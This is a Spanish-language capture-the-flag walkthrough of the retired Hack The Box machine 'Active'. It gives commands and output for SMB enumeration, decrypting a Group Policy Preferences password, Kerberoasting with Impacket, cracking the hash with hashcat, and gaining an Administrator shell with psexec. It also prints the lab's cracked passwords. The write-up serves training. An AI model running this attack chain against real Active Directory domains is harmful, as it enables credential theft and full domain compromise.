# Active-HTB
Desarrollo de la VM ACTIVE de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active1.jpg" width=80% />

## 3. Enumeración

### 3.1. Enumeración TCP/139

- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.

```
# enum4linux -a -M -l -d 10.129.126.89   

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Mar 31 23:19:37 2022

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.129.126.89
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.129.126.89    |
 =====================================================
[E] Can't find workgroup/domain


 =============================================
|    Nbtstat Information for 10.129.126.89    |
 =============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.129.126.89
No reply from 10.129.126.89

 ======================================
|    Session Check on 10.129.126.89    |
 ======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Server 10.129.126.89 allows sessions using username '', password ''
[+] Got domain/workgroup name:

 ======================================================
|    Getting information via LDAP for 10.129.126.89    |
 ======================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[+] Long domain name for 10.129.126.89: active.htb
[+] 10.129.126.89 appears to be a root/parent DC

 ============================================
|    Getting domain SID for 10.129.126.89    |
 ============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 10.129.126.89    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.126.89 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[+] Got OS info for 10.129.126.89 from srvinfo:
	10.129.126.89  Wk Sv PDC Tim NT     Domain Controller
	platform_id     :	500
	os version      :	6.1
	server type     :	0x80102b

 ==============================
|    Users on 10.129.126.89    |
 ==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ============================================
|    Machine Enumeration on 10.129.126.89    |
 ============================================
[E] Internal error.  Not implmented in this version of enum4linux.

 ==========================================
|    Share Enumeration on 10.129.126.89    |
 ==========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
do_connect: Connection to 10.129.126.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.126.89
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/ADMIN$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/C$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/IPC$	Mapping: OK	Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/NETLOGON	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/Replication	Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.126.89/SYSVOL	Mapping: DENIED, Listing: N/A
//10.129.126.89/Users	Mapping: DENIED, Listing: N/A

 =====================================================
|    Password Policy Information for 10.129.126.89    |
 =====================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[E] Unexpected error from polenum:


[+] Attaching to 10.129.126.89 using a NULL share

[+] Trying protocol 139/SMB...

[!] Protocol failed: Cannot request session (Called Name:10.129.126.89)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[E] Failed to get password policy with rpcclient


 ===============================
|    Groups on 10.129.126.89    |
 ===============================

[+] Getting builtin groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin group memberships:

[+] Getting local groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting local group memberships:

[+] Getting domain groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.129.126.89 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.

 ==============================================
|    Getting printer info for 10.129.126.89    |
 ==============================================
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu Mar 31 23:21:30 2022
```

- Allí identificamos carpetas compartidas. La carpeta REPLICATION puede ser accedida.

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active2.jpg" width=80% />


### 3.2. Accediendo a Carpeta Compartida

- Accedemos a la carpeta compartida y descargamos su contenido de manera recursiva

```
┌──(root㉿kali)-[~/HT]
└─# smbclient \\\\10.129.126.89\\Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

		5217023 blocks of size 4096. 275073 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active3.jpg" width=80% />


- Verificamos su contenido y resalta el archivo Groups.xml

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active4.jpg" width=80% />


- El archivo Groups XML tiene un contraseña cifrada.

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active5.jpg" width=80% />


## 4. Explotación

- Toca crackear la contraseña identificada.
- Busqué en GOOGLE información referencial y lo primero que encontré fue esto.

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active6.jpg" width=80% />

- De la lectura podemos resumir lo siguiente:
* El cifrado del password utiliza AES
* Microsoft publicó la llave AES
* Existen herramientas para descifrar contraseñas en archivos de configuración del AD

- Craking a la contraseña

```
┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"      
GPPstillStandingStrong2k18
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active7.jpg" width=80% />


## 5. Elevando Privilegios

### 5.1. Kerborasting

- Con el usuario y contraseña que obtenemos podemos realizar diferentes ataques.
- Sobre servidores con el rol de AD podemos realizar KERBEROASTING y ver si obtener credenciales.


```
┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.126.89 -request -outputfile hashes.kerberoast
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-03-31 14:28:53.362933             



                                                                                                                 
┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# cat hashes.kerberoast 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a0781727bd05f4255c5a9dff50412991$cc6a613afd2654efb4dfb68e25cdc74c8be20164ad3ec0280e2491fecbc07de2fe7b65c2e78737dee76b0ac5a0994f532f8cd79ba6cd45141ef637c10bc0b73cd4b023f61ee9999e10a1b69db0cd6ac1e6e4677991184d317d4a7a3d11d06dd9d7ffe40fc930c55d3dbe00f9e6e6b7110222e6ebae1d6dcf8dac67e95bb3c9eaca446dbfc83ae974f06cc8cf88f36bb72441e4e9a1968a2f1a6554f5afbb9682af10a53381b5d1c11c3e5a7e643ca199361b9057f6975d33ebde820d97f071ce424d9b26997c9f2d1091a9b52e19ea731b59ea2352545b240443acda7b320b8b3b6f92739bc54fd2a9270bc602c31527c4084982a067442b9835226ae95286deba2e672f5464f82ec30cb4aa9247aa8af0e19528f2e6d54bc98ba9d23a5c415dfcc530ac60c48002433c2867fd3563b448931f36f28eca54cef8c953ed01b06b35680c13cfdb388fb3e50408e100f481db73ea516da0898772ad00cdf653aff2fbd053ebbd8853b89bad92169a5e3190ac891986ba9e2116d26841b4698d3789e9583818248332b484d66e98d5f5bc1502a026aab6792ac348ee6ddc1159bcc08ab596e92555bd142d03687429c4e69789266a7fda46798e060057bf66a76f4750b45525c04fb4be3519214308ddd9b45a34fb163cb6ebbe62602d88ef4b04fb15cd147f25f885690e91ab5ce3854e850c75feef677722a56f229469d1e8a40caccc2005416017b41eac38fc2d825fa0b6e966057b635b7af130c21dd043e97a7bd327cc9bc2e9d4f472f81f677d58026f34768feffbd168ad92ff79b435f5c86c1fc4920a7b192290c420ba907b5d4aefe79d9569db9e0c8ed51af9010db792eeadc64dbfade5b327026d81c65250c8a361a54ed730d90216ecf8ac6d3bc8f87f772ffef5acbf137770fc205d40c5c714cb1ba97c4589c3e6fb4e8073a5103ecc5fcdac01446cd0203b8bba6c46a49aeba17e0cf8186ca6add77dddfa2ffd52b20427ad314130773908050e3b955019edd6c598effdde09ad14e0aa76b0b5753a9cbc97ba96299171e87e54eb53db24eb9eda42dab5053d06d43b98eb6539f177ff2ae805b33403858283e93b0e8e8c871364d34b27b7f62b23403a9253cf62b9182f142cfd3e42024e705db75d9ec6aff9a1dbab5554ba377d1f7c7a51e2d99317488a9a3644b9a8ba8b3fbc7e53291b365aac808a10aad1b06fdd641384cc738a23ac7cdf39e8a25365f161225ab42ec2fb8ccdbfe16d38c1
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active8.jpg" width=80% />


### 5.2. Cracking 

- Utilizamos HASHCAT para realizar cracking

```
└─# hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt                          
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active9.jpg" width=80% />

- Ya tenemos el usuario: Administrator y el password: Ticketmaster1968


## 6. Accediendo remotamente

```
└─# /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.129.126.89
```

<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active10.jpg" width=80% />































